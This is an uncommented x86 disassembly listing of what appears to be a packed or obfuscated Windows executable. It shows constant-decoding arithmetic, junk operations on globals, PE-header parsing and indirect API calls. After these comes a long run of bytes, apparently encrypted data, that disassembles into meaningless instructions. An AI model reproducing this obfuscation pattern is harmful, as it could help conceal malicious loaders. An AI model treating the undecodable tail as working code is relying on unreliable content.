  4028ba:	ret    0xc
  4028bd:	push   ebp
  4028be:	mov    ebp,esp
  4028c0:	push   ecx
  4028c1:	and    DWORD PTR ds:0x42d010,0x0
  4028cb:	jmp    0x4028de
  4028d0:	xor    eax,eax
  4028d2:	add    eax,DWORD PTR ds:0x42d010
  4028d8:	inc    eax
  4028d9:	mov    ds:0x42d010,eax
  4028de:	cmp    DWORD PTR ds:0x42d010,0x1c
  4028e5:	jae    0x402908
  4028eb:	cmp    DWORD PTR ds:0x42d010,0x24
  4028f2:	jne    0x402903
  4028f8:	push   0x42c010
  4028fd:	call   DWORD PTR ds:0x42e9ab
  402903:	jmp    0x4028d0
  402908:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40290f:	add    edx,0x297b
  402915:	mov    eax,DWORD PTR [ebp+0x8]
  402918:	movsx  eax,BYTE PTR [eax]
  40291b:	add    edx,edx
  40291d:	mov    edx,0x3272e0
  402922:	sbb    DWORD PTR ds:0x429014,0x3776
  40292c:	sub    eax,edx
  40292e:	mov    ecx,0x7510899
  402933:	xor    DWORD PTR ds:0x429014,0x42b000
  40293d:	xor    eax,ecx
  40293f:	mov    DWORD PTR ds:0x429008,0x73b1
  402949:	cmp    eax,0xf89c85f4
  40294e:	mov    DWORD PTR ds:0x42c014,0x53e4
  402958:	jne    0x402987
  40295e:	mov    eax,DWORD PTR [ebp+0x8]
  402961:	push   esi
  402962:	mov    esi,DWORD PTR [ebp+0x8]
  402965:	add    esi,DWORD PTR [eax+0x3c]
  402968:	mov    DWORD PTR [ebp+0x8],esi
  40296b:	mov    eax,DWORD PTR [ebp-0x4]
  40296e:	mov    esi,DWORD PTR [ebp+0x8]
  402971:	xor    eax,ecx
  402973:	add    eax,edx
  402975:	cmp    DWORD PTR [esi+0x54],eax
  402978:	pop    esi
  402979:	je     0x402987
  40297f:	mov    eax,DWORD PTR [ebp+0x8]
  402982:	jmp    0x40298e
  402987:	mov    eax,DWORD PTR [ebp-0x4]
  40298a:	xor    eax,ecx
  40298c:	add    eax,edx
  40298e:	leave  
  40298f:	ret    0x4
  402992:	push   ebp
  402993:	mov    ebp,esp
  402995:	sub    esp,0x40
  402998:	push   ebx
  402999:	adc    DWORD PTR ds:0x42d000,0x42b014
  4029a3:	push   esi
  4029a4:	push   edi
  4029a5:	lea    eax,[ebp-0x24]
  4029a8:	push   eax
  4029a9:	add    DWORD PTR ds:0x429028,0x429004
  4029b3:	lea    eax,[ebp-0x20]
  4029b6:	push   eax
  4029b7:	xor    DWORD PTR ds:0x42c00c,0x5e29
  4029c1:	call   DWORD PTR ds:0x42e9a7
  4029c7:	sub    DWORD PTR ds:0x42a018,0x7df1
  4029d1:	push   0x21
  4029d3:	push   0x434
  4029d8:	sbb    DWORD PTR ds:0x429000,0x54d2
  4029e2:	push   0x98678765
  4029e7:	sub    DWORD PTR ds:0x42d014,0x42c00c
  4029f1:	call   DWORD PTR ds:0x42e983
  4029f7:	xor    DWORD PTR ds:0x429000,edx
  4029fd:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  402a04:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  402a0b:	mov    eax,DWORD PTR [ebp-0x4]
  402a0e:	mov    esi,0x7510899
  402a13:	xor    eax,esi
  402a15:	mov    edi,DWORD PTR ds:0x42b01c
  402a1b:	adc    DWORD PTR ds:0x429010,edi
  402a21:	mov    edi,0x3272e0
  402a26:	add    eax,edi
  402a28:	dec    DWORD PTR ds:0x429000
  402a2e:	mov    DWORD PTR [ebp-0x1c],eax
  402a31:	mov    eax,DWORD PTR [ebp+0x14]
  402a34:	adc    DWORD PTR ds:0x42c000,0x42b014
  402a3e:	test   eax,eax
  402a40:	je     0x402a4e
  402a46:	mov    eax,DWORD PTR [ebp+0x14]
  402a49:	mov    eax,DWORD PTR [eax]
  402a4b:	mov    DWORD PTR [ebp-0x1c],eax
  402a4e:	xor    eax,eax
  402a50:	xor    eax,DWORD PTR ds:0x42901c
  402a56:	and    eax,DWORD PTR ds:0x42b000
  402a5c:	mov    ds:0x42901c,eax
  402a61:	mov    eax,DWORD PTR [ebp-0x4]
  402a64:	xor    eax,esi
  402a66:	adc    ebx,DWORD PTR ds:0x429024
  402a6c:	add    eax,edi
  402a6e:	mov    DWORD PTR [ebp-0x8],eax
  402a71:	sbb    ebx,DWORD PTR ds:0x42c008
  402a77:	mov    eax,DWORD PTR [ebp-0xc]
  402a7a:	mov    DWORD PTR ds:0x42b014,0x1d
  402a84:	cmp    DWORD PTR ds:0x42b014,0x0
  402a8b:	je     0x402aca
  402a91:	cmp    DWORD PTR ds:0x42b014,0x20
  402a98:	jne    0x402ab6
  402a9e:	push   0x3b9b
  402aa3:	push   DWORD PTR [ebp-0x24]
  402aa6:	push   0x42d018
  402aab:	push   0x5e20
  402ab0:	call   DWORD PTR ds:0x42e9af
  402ab6:	xor    ebx,ebx
  402ab8:	or     ebx,DWORD PTR ds:0x42b014
  402abe:	dec    ebx
  402abf:	mov    DWORD PTR ds:0x42b014,ebx
  402ac5:	jmp    0x402a84
  402aca:	xor    eax,esi
  402acc:	and    DWORD PTR ds:0x42a01c,0x0
  402ad6:	mov    ebx,DWORD PTR ds:0x42a01c
  402adc:	inc    ebx
  402add:	mov    DWORD PTR ds:0x42a01c,ebx
  402ae3:	cmp    DWORD PTR ds:0x42a01c,0xd
  402aea:	jne    0x402af6
  402af0:	call   DWORD PTR ds:0x42e9b3
  402af6:	cmp    DWORD PTR ds:0x42a01c,0xc
  402afd:	jne    0x402b10
  402b03:	mov    ebx,DWORD PTR ds:0x42a01c
  402b09:	inc    ebx
  402b0a:	mov    DWORD PTR ds:0x42a01c,ebx
  402b10:	cmp    DWORD PTR ds:0x42a01c,0x15
  402b17:	jb     0x402ad6
  402b1d:	or     DWORD PTR ds:0x42c004,edx
  402b23:	add    eax,edi
  402b25:	sub    DWORD PTR ds:0x42b008,ebx
  402b2b:	mov    DWORD PTR [ebp-0x2c],eax
  402b2e:	mov    eax,DWORD PTR [ebp-0x4]
  402b31:	xor    eax,esi
  402b33:	add    eax,edi
  402b35:	dec    ebx
  402b36:	mov    DWORD PTR [ebp-0x38],eax
  402b39:	mov    DWORD PTR ds:0x42a00c,0x11
  402b43:	cmp    DWORD PTR ds:0x42a00c,0x0
  402b4a:	je     0x402bcf
  402b50:	cmp    DWORD PTR ds:0x42a00c,0x1b
  402b57:	jne    0x402b7d
  402b5d:	push   DWORD PTR [ebp-0x28]
  402b60:	push   0x42a000
  402b65:	push   DWORD PTR [ebp-0x24]
  402b68:	push   0x6762
  402b6d:	push   0x632b
  402b72:	push   0x871c
  402b77:	call   DWORD PTR ds:0x42e9b7
  402b7d:	xor    ebx,ebx
  402b7f:	xor    ebx,DWORD PTR ds:0x42a00c
  402b85:	dec    ebx
  402b86:	mov    DWORD PTR ds:0x42a00c,ebx
  402b8c:	jmp    0x402b43
  402b91:	and    DWORD PTR ds:0x42d018,0x0
  402b9b:	xor    eax,eax
  402b9d:	xor    eax,DWORD PTR ds:0x42d018
  402ba3:	inc    eax
  402ba4:	mov    ds:0x42d018,eax
  402ba9:	cmp    DWORD PTR ds:0x42d018,0x2a
  402bb0:	jne    0x402bbc
  402bb6:	call   DWORD PTR ds:0x42e9bb
  402bbc:	cmp    DWORD PTR ds:0x42d018,0x1c
  402bc3:	jb     0x402b9b
  402bc9:	and    ebx,0x7bf
  402bcf:	mov    ebx,DWORD PTR [ebp-0x4]
  402bd2:	xor    ebx,esi
  402bd4:	adc    DWORD PTR ds:0x42d01c,0x429024
  402bde:	add    ebx,edi
  402be0:	xor    DWORD PTR ds:0x42d008,0x22f2
  402bea:	mov    eax,DWORD PTR [ebp-0x2c]
  402bed:	xor    DWORD PTR ds:0x42a008,0x42d00c
  402bf7:	sub    eax,edi
  402bf9:	lea    ecx,[ebx-0x3272e0]
  402bff:	adc    DWORD PTR ds:0x42c01c,0x429010
  402c09:	xor    eax,esi
  402c0b:	xor    ecx,esi
  402c0d:	cmp    ecx,eax
  402c0f:	mov    DWORD PTR ds:0x42a014,0x880
  402c19:	je     0x405220
  402c1f:	and    DWORD PTR ds:0x42d018,0x0
  402c29:	jmp    0x402c3c
  402c2e:	xor    eax,eax
  402c30:	or     eax,DWORD PTR ds:0x42d018
  402c36:	inc    eax
  402c37:	mov    ds:0x42d018,eax
  402c3c:	cmp    DWORD PTR ds:0x42d018,0x1f
  402c43:	jae    0x402c7e
  402c49:	cmp    DWORD PTR ds:0x42d018,0x26
  402c50:	jne    0x402c69
  402c56:	push   0x847e
  402c5b:	push   0x42901c
  402c60:	push   DWORD PTR [ebp-0x20]
  402c63:	call   DWORD PTR ds:0x42e9bf
  402c69:	jmp    0x402c2e
  402c6e:	mov    eax,ds:0x42b010
  402c73:	and    eax,DWORD PTR ds:0x429010
  402c79:	mov    ds:0x42b010,eax
  402c7e:	mov    eax,DWORD PTR [ebp-0x4]
  402c81:	xor    eax,esi
  402c83:	mov    DWORD PTR ds:0x42c008,0x7a4b
  402c8d:	add    eax,edi
  402c8f:	cmp    ebx,eax
  402c91:	mov    DWORD PTR ds:0x42b000,0x3723
  402c9b:	jne    0x405184
  402ca1:	push   DWORD PTR [ebp+0x8]
  402ca4:	neg    DWORD PTR ds:0x42d018
  402caa:	call   0x4028bd
  402caf:	movzx  ecx,BYTE PTR ds:0x42c000
  402cb6:	xor    DWORD PTR ds:0x429000,ecx
  402cbc:	mov    DWORD PTR [ebp-0x14],eax
  402cbf:	sbb    eax,0x7bdb
  402cc4:	mov    eax,DWORD PTR [ebp-0x4]
  402cc7:	mov    ecx,DWORD PTR [ebp-0x14]
  402cca:	sbb    DWORD PTR ds:0x42b00c,0x398d
  402cd4:	xor    eax,esi
  402cd6:	add    eax,edi
  402cd8:	mov    DWORD PTR ds:0x42a018,0x3718
  402ce2:	jmp    0x405039
  402ce7:	dec    ecx
  402ce8:	je     0x402ca4
  402cea:	dec    ebp
  402ceb:	stos   DWORD PTR es:[edi],eax
  402cec:	cmp    ecx,DWORD PTR [ebp+0x6a681074]
  402cf2:	adc    eax,0xacf5d506
  402cf7:	jp     0x402d73
  402cf9:	jp     0x402d75
  402cfb:	xor    BYTE PTR [edi+0x7a],bl
  402cfe:	jp     0x402d11
  402d00:	sub    BYTE PTR [edi],dl
  402d02:	cmp    eax,0x2f1b2115
  402d07:	popa   
  402d08:	ss gs data16 jge 0x402d89
  402d0d:	push   0x6a
  402d0f:	imul   esi,DWORD PTR [edx],0x6cfdd8c1
  402d15:	inc    esp
  402d16:	imul   edi,DWORD PTR [ebp+0x5b],0xffffffac
  402d1a:	jl     0x402d85
  402d1c:	push   ebp
  402d1d:	iret   
  402d1e:	pop    ecx
  402d1f:	dec    edx
  402d20:	cmp    al,0x88
  402d22:	cli    
  402d23:	xchg   DWORD PTR [esi+0x57],esi
  402d26:	dec    ecx
  402d27:	jg     0x402d60
  402d29:	mov    WORD PTR [esi+0x3ba2bc7f],fs
  402d2f:	sub    bh,bh
  402d31:	data16 fdivr st,st(2)
  402d34:	push   ebx
  402d35:	jg     0x402d55
  402d37:	jmp    0xe9faf671
  402d3c:	xchg   DWORD PTR [ebx],edx
  402d3e:	fimul  WORD PTR [ebx-0x54aaf0db]
  402d44:	mov    al,al
  402d46:	imul   DWORD PTR [ecx-0x27]
  402d49:	add    al,dl
  402d4b:	push   cs
  402d4c:	cli    
  402d4d:	es adc al,0x44
  402d50:	or     BYTE PTR [esi],ah
  402d52:	imul   esp,DWORD PTR [ebp+esi*4-0x51],0x13
  402d57:	pop    ebp
  402d58:	add    DWORD PTR [esi+0x2b45e5ff],esp
  402d5e:	jo     0x402d92
  402d60:	les    ebx,FWORD PTR [ebx-0xb]
  402d63:	sbb    bh,dl
  402d65:	je     0x402d24
  402d67:	arpl   cx,bx
  402d69:	xchg   esp,eax
  402d6a:	pop    edi
  402d6b:	mov    edi,DWORD PTR [ebp+0x4d821007]
  402d71:	repz sahf 
  402d73:	cmp    BYTE PTR [edx+0x73],dh
  402d76:	or     ebx,edx
  402d78:	sub    DWORD PTR [edx-0x77],edx
  402d7b:	xor    BYTE PTR [ebx],dh
  402d7d:	push   eax
  402d7e:	jecxz  0x402d4f
  402d80:	mov    ah,BYTE PTR ds:0xc8b7cc85
  402d86:	test   BYTE PTR [ebp-0x20],ch
  402d89:	inc    ecx
  402d8a:	push   edx
  402d8b:	dec    eax
  402d8c:	or     BYTE PTR [esi],bh
  402d8e:	repz add ebp,DWORD PTR ss:[ecx+0x4ca7ca4b]
  402d96:	fadd   QWORD PTR [eax]
  402d98:	push   esi
  402d99:	stc    
  402d9a:	push   edx
  402d9b:	push   esi
  402d9c:	mov    eax,ds:0xf4bf64f5
  402da1:	inc    edx
  402da2:	sbb    al,0xec
  402da4:	sbb    esp,ebp
  402da6:	adc    al,0x60
  402da8:	aad    0x9
  402daa:	loope  0x402e25
  402dac:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  402dae:	pop    esp
  402daf:	mov    cl,0x59
  402db1:	dec    edi
  402db2:	sub    al,0x8c
  402db4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402db5:	out    dx,al
  402db6:	and    al,0x5d
  402db8:	shr    BYTE PTR [edx-0xb71c7c],cl
  402dbe:	(bad)  
  402dbf:	rol    BYTE PTR [edx+0x1b211b14],1
  402dc5:	pop    ebx
  402dc6:	std    
  402dc7:	shr    ebx,0x6e
  402dca:	in     al,0xaa
  402dcc:	popf   
  402dcd:	cmp    DWORD PTR [eax],ebp
  402dcf:	jne    0x402d60
  402dd1:	aaa    
  402dd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dd3:	fucomi st,st(2)
  402dd5:	or     al,0x51
  402dd7:	fiadd  WORD PTR [ebx-0x6d]
  402dda:	(bad)  
  402ddb:	enter  0x3543,0xa6
  402ddf:	ficomp WORD PTR [ebx]
  402de1:	xor    ch,bl
  402de3:	stc    
  402de4:	out    dx,al
  402de5:	shl    DWORD PTR [edx-0x5321867],0x65
  402dec:	xchg   edi,eax
  402ded:	push   ds
  402dee:	ja     0x402dd4
  402df0:	xchg   ebp,eax
  402df1:	outs   dx,BYTE PTR ds:[esi]
  402df2:	rol    BYTE PTR [eax-0x44776718],cl
  402df8:	xchg   BYTE PTR [eax+0x7e384f89],al
  402dfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dff:	mov    cl,0xff
  402e01:	inc    esp
  402e02:	popa   
  402e03:	xchg   edx,eax
  402e04:	(bad)  
  402e05:	je     0x402dba
  402e07:	dec    eax
  402e08:	pop    esp
  402e09:	btc    esp,ebp
  402e0c:	int3   
  402e0d:	xchg   ebx,eax
  402e0e:	inc    esp
  402e0f:	xor    BYTE PTR [bx+0x7a],dl
  402e13:	jmp    0xb06dcab9
  402e18:	retf   0x18ba
  402e1b:	or     ebp,DWORD PTR [edx-0x21ed9c10]
  402e21:	mov    bh,0x93
  402e23:	adc    eax,0xa279fc67
  402e28:	clc    
  402e29:	jg     0x402e7d
  402e2b:	jl     0x402e5f
  402e2d:	(bad)  
  402e2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e2f:	sbb    BYTE PTR [esi],cl
  402e31:	retf   0xc52e
  402e34:	add    bl,BYTE PTR [edx-0x18]
  402e37:	push   eax
  402e38:	(bad)  
  402e39:	inc    eax
  402e3a:	mov    ebp,0xe5868479
  402e3f:	loope  0x402e14
  402e41:	sbb    al,0x6c
  402e43:	adc    bh,BYTE PTR [ebx-0x35]
  402e46:	push   cs
  402e47:	dec    eax
  402e48:	and    eax,0xfe980114
  402e4d:	fnstsw WORD PTR [edi+0x2e257bfb]
  402e53:	sub    eax,0xb42bcbe7
  402e58:	out    0x9,eax
  402e5a:	cmp    bl,BYTE PTR [esi]
  402e5c:	xor    al,0xec
  402e5e:	jb     0x402e9f
  402e60:	out    dx,al
  402e61:	pop    edx
  402e62:	rcl    DWORD PTR [esi+0x62c77a21],1
  402e68:	mov    eax,ds:0x98fdd532
  402e6d:	adc    ecx,edx
  402e6f:	dec    edx
  402e70:	cmc    
  402e71:	sar    cl,cl
  402e73:	in     eax,dx
  402e74:	test   edx,0x6b3e87b5
  402e7a:	sbb    al,0xcf
  402e7c:	dec    eax
  402e7d:	call   0xc3ce0020
  402e82:	in     eax,0x68
  402e84:	pushf  
  402e85:	xor    edx,DWORD PTR [ebx]
  402e87:	stos   DWORD PTR es:[edi],eax
  402e88:	lods   eax,DWORD PTR ds:[esi]
  402e89:	inc    ebx
  402e8a:	ret    0xcf9c
  402e8d:	mov    cl,0x14
  402e8f:	mov    eax,ds:0x32857e5d
  402e94:	mov    bh,0x3b
  402e96:	mov    gs,WORD PTR [ebx-0x1ef3435e]
  402e9c:	adc    eax,0x69cf82da
  402ea1:	fldcw  WORD PTR [edi+0x64]
  402ea4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ea5:	sub    eax,0xd953231f
  402eaa:	mov    bh,dh
  402eac:	lock lahf 
  402eae:	cdq    
  402eaf:	jbe    0x402ec8
  402eb1:	mov    dl,0x64
  402eb3:	std    
  402eb4:	sub    ebx,esi
  402eb6:	or     edx,0x59
  402eb9:	outs   dx,DWORD PTR ds:[esi]
  402eba:	sub    al,BYTE PTR [ebx-0x38]
  402ebd:	or     al,BYTE PTR [edi+ecx*2-0x3797e948]
  402ec4:	inc    ebx
  402ec5:	clc    
  402ec6:	retf   
  402ec7:	loope  0x402ea9
  402ec9:	pop    ebp
  402eca:	cmc    
  402ecb:	jne    0x402f36
  402ecd:	adc    al,0xe3
  402ecf:	mov    edi,0x35c8c55b
  402ed4:	or     eax,0x5673f57e
  402ed9:	test   eax,0xd328437b
  402ede:	mov    ch,0xcc
  402ee0:	in     eax,dx
  402ee1:	mov    ds:0x42095041,al
  402ee6:	stc    
  402ee7:	idiv   DWORD PTR [ebx]
  402ee9:	xor    al,0x33
  402eeb:	pop    ds
  402eec:	sar    BYTE PTR [esi],0xea
  402eef:	xor    eax,0x2f226b2a
  402ef4:	and    BYTE PTR [ebp-0x46f4326],0xb9
  402efb:	sub    DWORD PTR [ebx],edx
  402efd:	call   0x6fed:0x10bcc117
  402f04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f05:	push   edx
  402f06:	popa   
  402f07:	jle    0x402f85
  402f09:	dec    edi
  402f0a:	push   ebp
  402f0b:	pop    ss
  402f0c:	rcl    DWORD PTR [ebx+0x492db840],0xb3
  402f13:	xchg   edx,eax
  402f14:	in     al,0x9a
  402f16:	iret   
  402f17:	sbb    esp,esp
  402f19:	cli    
  402f1a:	pop    esi
  402f1b:	sub    ebp,DWORD PTR [esi+eax*2+0x62e49acd]
  402f22:	jne    0x402ec9
  402f24:	mov    eax,ds:0x3efeb35d
  402f29:	mov    ss,WORD PTR [ecx]
  402f2b:	add    al,0xcd
  402f2d:	sbb    bh,dh
  402f2f:	xchg   esp,eax
  402f30:	dec    eax
  402f31:	cmp    DWORD PTR [edx-0x2eb4cee4],ecx
  402f37:	fucom  st(7)
  402f39:	push   0xa8464e78
  402f3e:	lods   al,BYTE PTR ds:[esi]
  402f3f:	out    dx,eax
  402f40:	int    0x37
  402f42:	fnstenv [edi-0x2b]
  402f45:	fcomip st,st(1)
  402f47:	pop    eax
  402f48:	(bad)  
  402f49:	ins    DWORD PTR es:[edi],dx
  402f4a:	mov    cl,0x33
  402f4c:	push   edi
  402f4d:	imul   BYTE PTR [esi-0x3482507b]
  402f53:	pop    ecx
  402f54:	fsub   QWORD PTR [ebx]
  402f56:	and    DWORD PTR [ebx-0x49],ebx
  402f59:	iret   
  402f5a:	fnstsw WORD PTR [esi+ebp*8+0x1c]
  402f5e:	xchg   edx,eax
  402f5f:	popa   
  402f60:	or     BYTE PTR [ebx-0xd],dh
  402f63:	or     al,0xc4
  402f65:	pop    ecx
  402f66:	sub    al,0x32
  402f68:	idiv   DWORD PTR [eax]
  402f6a:	stc    
  402f6b:	ins    DWORD PTR es:[edi],dx
  402f6c:	add    DWORD PTR [eax*1-0x8c4adde],esp
  402f73:	xor    edx,0x7d
  402f76:	sub    al,0xa
  402f78:	and    eax,0xa351b503
  402f7d:	xchg   edi,eax
  402f7e:	sti    
  402f7f:	pop    ecx
  402f80:	imul   eax,DWORD PTR [ecx+0x55121a27],0x5c6ad75
  402f8a:	sub    BYTE PTR [ecx+0x58a57825],dl
  402f90:	imul   ebx,DWORD PTR [esi],0xa86385f9
  402f96:	jbe    0x402fb8
  402f98:	jl     0x402f66
  402f9a:	les    esp,FWORD PTR [edi+edi*2]
  402f9d:	ins    DWORD PTR es:[edi],dx
  402f9e:	outs   dx,BYTE PTR ds:[esi]
  402f9f:	in     al,0x5b
  402fa1:	in     al,dx
  402fa2:	outs   dx,DWORD PTR ds:[esi]
  402fa3:	cmp    DWORD PTR [esi+esi*2-0x2c5f7fa0],ebp
  402faa:	addr16 pop ecx
  402fac:	and    dh,BYTE PTR [ebp+0xdc3a8f7]
  402fb2:	push   cs
  402fb3:	fmul   QWORD PTR [edx+0x35]
  402fb6:	cs mov cx,0x23e4
  402fbb:	cdq    
  402fbc:	mov    ebp,0x2328ed6e
  402fc1:	mov    bl,0xfc
  402fc3:	push   ebx
  402fc4:	mov    ds:0x88720768,al
  402fc9:	test   al,0xee
  402fcb:	add    BYTE PTR ds:0x538d9b69,bl
  402fd1:	and    ch,al
  402fd3:	enter  0x8b5c,0x8e
  402fd7:	fiadd  WORD PTR ds:0x444dfbb2
  402fdd:	in     al,0xa9
  402fdf:	sub    ebx,DWORD PTR [eax-0x5a51254c]
  402fe5:	sti    
  402fe6:	int3   
  402fe7:	cmp    edx,DWORD PTR [edi-0x2f469e54]
  402fed:	xchg   BYTE PTR [eax+0x95b6d20],cl
  402ff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ff4:	xchg   ecx,eax
  402ff5:	es push cs
  402ff7:	jmp    0xe2c61b0f
  402ffc:	jne    0x402fdc
  402ffe:	retf   0xdc10
  403001:	ror    DWORD PTR [esi+0x4d],1
  403004:	fadd   QWORD PTR [esi]
  403006:	push   edi
  403007:	aam    0x85
  403009:	adc    DWORD PTR [edx+0x445e80ca],edi
  40300f:	or     esp,DWORD PTR [edi+0x7d1da2b8]
  403015:	(bad)  
  403016:	cs stos BYTE PTR es:[edi],al
  403018:	call   0x7f111fa3
  40301d:	sbb    al,0x1e
  40301f:	or     BYTE PTR [eax],cl
  403021:	sahf   
  403022:	aaa    
  403023:	jmp    0x8ca7:0xe1ca438f
  40302a:	shl    DWORD PTR [ebx-0x4],0x50
  40302e:	imul   edx,ebx,0xf8361c6e
  403034:	xchg   esi,eax
  403035:	sbb    dl,BYTE PTR [ecx-0x59a93be6]
  40303b:	push   ss
  40303c:	lahf   
  40303d:	retf   
  40303e:	mov    WORD PTR [ecx+0x303f64c3],es
  403044:	cli    
  403045:	dec    DWORD PTR [esi]
  403047:	(bad)  
  403048:	(bad)  
  403049:	mov    ds:0x391d4882,al
  40304e:	fbstp  TBYTE PTR [bp-0x7]
  403053:	push   0xffffffb5
  403055:	push   esp
  403056:	ja     0x403062
  403058:	mov    dl,dh
  40305a:	pop    eax
  40305b:	adc    esi,DWORD PTR [edi]
  40305d:	inc    eax
  40305e:	ins    DWORD PTR es:[edi],dx
  40305f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403060:	in     al,0x8a
  403062:	jle    0x402ff1
  403064:	aam    0x3b
  403066:	xor    ah,ah
  403068:	sub    edx,DWORD PTR [eax+0x10]
  40306b:	test   BYTE PTR [ecx+0x62e7c652],cl
  403071:	fld    DWORD PTR [ecx+0x428e4eaf]
  403077:	test   eax,0xf8abff0e
  40307c:	je     0x402fff
  40307e:	or     al,0x10
  403080:	pop    esp
  403081:	mov    al,al
  403083:	aam    0x56
  403085:	ret    0x72bb
  403088:	mov    edx,ss
  40308a:	popf   
  40308b:	repz pop eax
  40308d:	cmp    DWORD PTR [ecx+0x9a4d72b],ebp
  403093:	cmp    al,0x39
  403095:	cmp    al,0xe
  403097:	leave  
  403098:	sbb    DWORD PTR ds:0x964da29e,esi
  40309e:	jnp    0x403031
  4030a0:	aas    
  4030a1:	jecxz  0x4030f3
  4030a3:	mov    cl,0xda
  4030a5:	loop   0x40308f
  4030a7:	xchg   edi,eax
  4030a8:	cs mov ebx,0x6d71daf9
  4030ae:	in     al,0x50
  4030b0:	push   ecx
  4030b1:	sub    ebx,DWORD PTR ss:[ecx+edi*8+0x620c6ece]
  4030b9:	ins    BYTE PTR es:[edi],dx
  4030ba:	hlt    
  4030bb:	jmp    0xd694:0x2a70
  4030c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030c2:	push   edi
  4030c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030c4:	ss jae 0x40313d
  4030c7:	push   eax
  4030c8:	adc    BYTE PTR [ebx-0x1ba98aff],dl
  4030ce:	sbb    ah,al
  4030d0:	xor    DWORD PTR [edx],edi
  4030d2:	and    DWORD PTR [eax+0x2],edi
  4030d5:	int3   
  4030d6:	push   esi
  4030d7:	fwait
  4030d8:	add    ah,ch
  4030da:	or     eax,0xb87963e8
  4030df:	rcr    BYTE PTR [eax],cl
  4030e1:	scas   al,BYTE PTR es:[edi]
  4030e2:	jno    0x4030e8
  4030e4:	xchg   ecx,eax
  4030e5:	fnstcw WORD PTR [ecx]
  4030e7:	xchg   ecx,eax
  4030e8:	je     0x403083
  4030ea:	adc    BYTE PTR [ebx+0x2],bl
  4030ed:	mov    bh,0xe3
  4030ef:	mov    bh,BYTE PTR [edx+0xf2e2462]
  4030f5:	rol    BYTE PTR [ebx],1
  4030f7:	and    DWORD PTR [edx+ebp*2-0x7f],0x5
  4030fc:	lods   eax,DWORD PTR ds:[esi]
  4030fd:	popa   
  4030fe:	fucomi st,st(4)
  403100:	jnp    0x403170
  403102:	rcl    BYTE PTR [ebp-0x2852d361],0xc2
  403109:	mov    ah,0x2e
  40310b:	xchg   edx,eax
  40310c:	pop    eax
  40310d:	jmp    0x4030db
  40310f:	lods   al,BYTE PTR ds:[esi]
  403110:	inc    ebx
  403111:	in     eax,dx
  403112:	popa   
  403113:	sub    BYTE PTR [edx-0x5748ac1c],bh
  403119:	shl    DWORD PTR [esi-0x5d9ef7f6],cl
  40311f:	cdq    
  403120:	adc    DWORD PTR [ebx+0x686817f7],ebp
  403126:	pop    es
  403127:	add    BYTE PTR [esi+0x5e8a0ec3],dl
  40312d:	mov    edi,0x8e39b0d1
  403132:	imul   ebx,DWORD PTR [ebx+0x13],0xa54b2113
  403139:	adc    eax,DWORD PTR [edx]
  40313b:	mov    ?,WORD PTR [esi-0x48]
  40313e:	sub    BYTE PTR [ebx],bl
  403140:	dec    esi
  403141:	js     0x40312b
  403143:	call   0xe7bc:0xcfd8134c
  40314a:	jp     0x403126
  40314c:	test   al,0xaf
  40314e:	push   es
  40314f:	call   FWORD PTR ds:0x63e912bc
  403155:	call   0x6455:0xa5530195
  40315c:	sub    edx,DWORD PTR [ebx]
  40315e:	and    bh,cl
  403160:	dec    edi
  403161:	inc    eax
  403162:	scas   al,BYTE PTR es:[edi]
  403163:	sbb    ah,bh
  403165:	pusha  
  403166:	fldenv [edi-0x58009225]
  40316c:	push   esp
  40316d:	mov    ch,0x23
  40316f:	test   al,0xbd
  403171:	inc    ebp
  403172:	xchg   ebx,eax
  403173:	jnp    0x40316c
  403175:	xchg   esi,eax
  403176:	ss push cs
  403178:	jnp    0x40312d
  40317a:	imul   ebp,DWORD PTR [ebp-0xe2e6052],0xce867963
  403184:	xchg   BYTE PTR [eax],bh
  403186:	jmp    0x7aca959f
  40318b:	test   BYTE PTR [edi-0x257587f8],al
  403191:	xchg   ebx,eax
  403192:	(bad)  
  403193:	fcmovnbe st,st(2)
  403195:	cmp    esi,esi
  403197:	mov    ecx,0x10ebc8b6
  40319c:	xor    al,0xb4
  40319e:	cli    
  40319f:	sahf   
  4031a0:	stos   DWORD PTR es:[edi],eax
  4031a1:	std    
  4031a2:	push   ss
  4031a3:	out    0x2,al
  4031a5:	dec    ebp
  4031a6:	cli    
  4031a7:	push   eax
  4031a8:	jnp    0x403169
  4031aa:	ja     0x4031ae
  4031ac:	or     BYTE PTR [esi+0x3cc2f9ef],ah
  4031b2:	imul   edi,DWORD PTR [eax],0x37bd8602
  4031b8:	push   0x523786f9
  4031bd:	pop    ss
  4031be:	scas   al,BYTE PTR es:[edi]
  4031bf:	hlt    
  4031c0:	imul   edx,DWORD PTR [esi+0x6f],0xec94707c
  4031c7:	sbb    DWORD PTR [esp+ecx*4-0x2bb36f38],esp
  4031ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031cf:	popf   
  4031d0:	loopne 0x40321c
  4031d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031d3:	jl     0x403157
  4031d5:	fisubr WORD PTR [ebx-0xe1c589a]
  4031db:	mov    edi,0x42ee209f
  4031e0:	pop    esp
  4031e1:	mov    ah,0xf5
  4031e3:	arpl   WORD PTR [edx-0x1cfe34af],bx
  4031e9:	push   esp
  4031ea:	ins    BYTE PTR es:[edi],dx
  4031eb:	stos   BYTE PTR es:[edi],al
  4031ec:	ins    DWORD PTR es:[edi],dx
  4031ed:	jg     0x40324b
  4031ef:	pop    edi
  4031f0:	sub    eax,0xeeceef35
  4031f5:	sar    dl,0xce
  4031f8:	pop    edi
  4031f9:	aam    0x81
  4031fb:	dec    eax
  4031fc:	jmp    0xea3bad44
  403201:	push   cs
  403202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403203:	xchg   ebx,eax
  403204:	mov    WORD PTR [edi],?
  403206:	mov    esi,?
